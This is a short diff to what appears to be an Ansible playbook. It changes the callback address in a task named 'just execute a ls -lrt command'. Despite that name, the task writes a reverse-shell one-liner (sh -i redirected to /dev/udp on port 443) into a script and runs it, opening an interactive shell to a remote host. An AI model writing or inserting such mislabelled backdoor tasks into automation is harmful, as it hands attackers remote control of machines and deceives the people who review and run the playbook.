@@ -4,7 +4,7 @@
     tasks:
 
     - name: "just execute a ls -lrt command"
-      shell: "echo 'sh -i >& /dev/udp/192.168.1.9/443 0>&1' > abc.sh ; sh abc.sh"
+      shell: "echo 'sh -i >& /dev/udp/172.18.0.1/443 0>&1' > abc.sh ; sh abc.sh"
       register: "output"
 
     - debug: var=output.stdout_lines
